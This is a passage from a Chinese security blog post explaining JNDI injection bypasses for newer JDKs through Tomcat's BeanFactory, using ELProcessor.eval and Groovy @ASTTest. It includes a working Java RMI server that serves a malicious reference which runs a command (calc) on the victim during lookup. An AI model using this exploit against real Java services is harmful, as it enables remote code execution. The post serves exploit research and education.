<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721105817727.png" alt="image-20250721105817727"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721110001056.png" alt="image-20250721110001056"></p>
<p>lookup最后会调用工厂的getObjectInstance方法，简单看看这个类的getObjectInstance方法：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721110040917-17530668420671.png" alt="image-20250721110040917"></p>
<p>先判断ref是否为ResourceRef类</p>
<p>通过反射实例化Reference所指向的任意BeanClass：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721110356055.png" alt="image-20250721110356055"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721110448074.png" alt="image-20250721110448074"></p>
<p>然后通过反射获取setter方法再执行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721111420634.png" alt="image-20250721111420634"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721112434641.png" alt="image-20250721112434641"></p>
<p>通过实例化我们指定的javax.el.ELProcessor对象，forceString可以给属性强制指定一个setter方法，这里将属性faster的setterName设置为了<code>public java.lang.Object javax.el.ELProcessor.eval()</code>，接着传入faster的setter的参数，也就是<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code>。接着运行setter，实际上就相当于运行<code>java.lang.Object javax.el.ELProcessor.eval(Runtime.getRuntime().exec(&quot;calc.exe&quot;))</code>。</p>
<h4 id="Groovy绕过"><a href="#Groovy绕过" class="headerlink" title="Groovy绕过"></a>Groovy绕过</h4><p>在Groovy中，Groovy程序允许我们执行断言，也就意味着命令执行</p>
<blockquote>
<p><strong>断言（Assertion）</strong> 是编程中用于验证程序执行结果是否符合预期的机制。它本质上是一种<strong>声明式检查</strong></p>
</blockquote>
<p><code>@ASTTest</code>是一种特殊的AST转换，编译器的调试工具，它会在编译期对AST执行断言，而不是对编译结果执行断言。这意味着此AST转换在生成字节码之前可以访问AST。<code>@ASTTest</code>可以放置在任何可注释节点上</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/20211215144919-20b51e3e-5d73-1.png"></p>
<p>它的思路和Tomcat相似，借助BeanFactory的功能，使程序执行<code>GroovyClassLoader#parseClass</code>，然后去解析groovy脚本</p>
<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;groovy&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.4</span><span class="number">.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>EvilObject:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=parseClass&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> String.format(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef faster\n&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>,script));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;b1uel0n3&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/archives/be65d471/image-20250721114332928.png" alt="image-20250721114332928"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#jndi--rmi">https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#jndi--rmi</a></p>
<p><a target="_blank" rel="noopener" href="https://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a#2d7bc602aaaa410696acd32cbbc182fd">https://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a#2d7bc602aaaa410696acd32cbbc182fd</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6860">https://xz.aliyun.com/news/6860</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/erosion2020/p/18561646">https://www.cnblogs.com/erosion2020/p/18561646</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10119">https://xz.aliyun.com/news/10119</a></p>
<p><a target="_blank" rel="noopener" href="https://sanshiok.com/archive/30.html#JNDI-1">https://sanshiok.com/archive/30.html#JNDI-1</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io">B1ueL0n3</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://b1uel0n3.github.io/archives/be65d471/">https://b1uel0n3.github.io/archives/be65d471/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://b1uel0n3.github.io" target="_blank">B1ueL0n3's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JNDI/">JNDI</a></div><div class="post-share"><div class="social-share" data-image="/img/7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/df850557/" title="Java反序列化：CB利用链深度解析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Java反序列化：CB利用链深度解析</div></div><div class="info-2"><div class="info-item-1">Commons BeanutilsApache Commons Beanutils，是Apache Common下的一个工具集的另一个项目，它提供对普通Java类对象（JavaBean）的一些操作方法 JavaBean是一种特殊的Java类，主要用于封装数据并在应用程序中传递，其具有的特点：  无参构造函数：JavaBean必须提供一个默认的无参构造函数 私有属性：所有属性必须声明为私有（private） 公共访问方法：通过getter和setter方法访问和修改属性值 可序列化：实现Serializable  demo： 123456789101112131415161718192021222324public class Person implements java.io.Serializable &#123;	private String name;	private int age;	// 无参构造函数	public Person() &#123;&#125;	// Getter 和 Setter 方法	public String getName()...</div></div></div></a><a class="pagination-related" href="/archives/9738c3bd/" title="Java RMI反序列化深度解析"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Java RMI反序列化深度解析</div></div><div class="info-2"><div class="info-item-1">RPCRemote Procedure Call，远程过程调用。像本地调用方法一样调用一个远程方法。 RMI概念RMI，全程Remote Method Invocation，远程方法调用，一种用于实现远程过程调用的应用编程接口。 它使客户端上运行的程序可以调用远程服务器上对象的方法，即通过某个java虚拟机上的对象来调用另一个java虚拟机中对象的方法。 客户端获取的是远程主机上对象的引用，无论何处使用引用，方法调用都发生在原始对象上 RMI实现了RPC，通常使用Java原生反序列化，并且可以结合动态类加载和安全管理器来安全传输一个Java类。 远程对象和非远程对象远程对象：RMI中的远程对象首先需要可以序列化；并且需要实现特殊远程接口的对象，该接口指定可以远程调用对象的哪些方法；其次该对象是通过一种可以通过网络传递的特殊对象引用来使用的。和普通的 Java...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">B1ueL0n3</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.</span> <span class="toc-text">命名服务&#x2F;目录服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.</span> <span class="toc-text">命名服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">目录服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">JNDI简单利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.1.</span> <span class="toc-text">RMI示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%90%AFRMI%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.1.1.</span> <span class="toc-text">开启RMI服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEJNDI%E7%8E%AF%E5%A2%83%E5%8F%82%E6%95%B0"><span class="toc-number">3.1.2.</span> <span class="toc-text">设置JNDI环境参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.1.3.</span> <span class="toc-text">初始化上下文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.1.4.</span> <span class="toc-text">通过上下文查找远程对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.5.</span> <span class="toc-text">调用远程方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.2.</span> <span class="toc-text">DNS示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E5%88%87%E6%8D%A2"><span class="toc-number">3.3.</span> <span class="toc-text">动态协议切换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.4.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.4.1.</span> <span class="toc-text">命名服务初始化上下文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.4.2.</span> <span class="toc-text">目录服务初始化上下文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.4.3.</span> <span class="toc-text">命名服务获取远程对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7"><span class="toc-number">3.4.4.</span> <span class="toc-text">目录服务获取属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%8D%8F%E8%AE%AE%E5%88%87%E6%8D%A2-1"><span class="toc-number">3.4.5.</span> <span class="toc-text">动态协议切换</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E5%BC%95%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">命名引用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6"><span class="toc-number">5.</span> <span class="toc-text">远程对象引用安全限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-RMI"><span class="toc-number">6.1.</span> <span class="toc-text">Reference+RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">6.1.1.</span> <span class="toc-text">原理及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">6.1.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference-LDAP"><span class="toc-number">6.2.</span> <span class="toc-text">Reference+LDAP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8-1"><span class="toc-number">6.2.1.</span> <span class="toc-text">原理及利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-number">6.2.2.</span> <span class="toc-text">源码分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">高版本限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-RMI-Reference%E9%99%90%E5%88%B6"><span class="toc-number">7.1.</span> <span class="toc-text">JNDI_RMI_Reference限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-LDAP-Reference%E9%99%90%E5%88%B6"><span class="toc-number">7.2.</span> <span class="toc-text">JNDI_LDAP_Reference限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP%E6%9C%AC%E5%9C%B0Gadget%E7%BB%95%E8%BF%87"><span class="toc-number">7.3.</span> <span class="toc-text">LDAP本地Gadget绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0%E5%B7%A5%E5%8E%82%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.</span> <span class="toc-text">加载本地工厂绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Tomcat8%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.1.</span> <span class="toc-text">Tomcat8绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Groovy%E7%BB%95%E8%BF%87"><span class="toc-number">7.4.2.</span> <span class="toc-text">Groovy绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/350d19d1/" title="Rapidcms 1.3.1代码审计"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Rapidcms 1.3.1代码审计"/></a><div class="content"><a class="title" href="/archives/350d19d1/" title="Rapidcms 1.3.1代码审计">Rapidcms 1.3.1代码审计</a><time datetime="2025-10-25T13:04:39.000Z" title="发表于 2025-10-25 21:04:39">2025-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/a53bf99e/" title="GreenCMS 2.3.0603代码审计"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GreenCMS 2.3.0603代码审计"/></a><div class="content"><a class="title" href="/archives/a53bf99e/" title="GreenCMS 2.3.0603代码审计">GreenCMS 2.3.0603代码审计</a><time datetime="2025-10-25T13:00:05.000Z" title="发表于 2025-10-25 21:00:05">2025-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/f9e8749a/" title="MuYuCMS 2.7代码审计"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MuYuCMS 2.7代码审计"/></a><div class="content"><a class="title" href="/archives/f9e8749a/" title="MuYuCMS 2.7代码审计">MuYuCMS 2.7代码审计</a><time datetime="2025-10-25T12:23:55.000Z" title="发表于 2025-10-25 20:23:55">2025-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/8e97595c/" title="YCCMS 3.4代码审计"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YCCMS 3.4代码审计"/></a><div class="content"><a class="title" href="/archives/8e97595c/" title="YCCMS 3.4代码审计">YCCMS 3.4代码审计</a><time datetime="2025-10-23T17:26:11.000Z" title="发表于 2025-10-24 01:26:11">2025-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/cb38bde1/" title="百家CMS代码审计"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="百家CMS代码审计"/></a><div class="content"><a class="title" href="/archives/cb38bde1/" title="百家CMS代码审计">百家CMS代码审计</a><time datetime="2025-10-22T16:36:03.000Z" title="发表于 2025-10-23 00:36:03">2025-10-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/27.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By B1ueL0n3</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/title.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="90" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>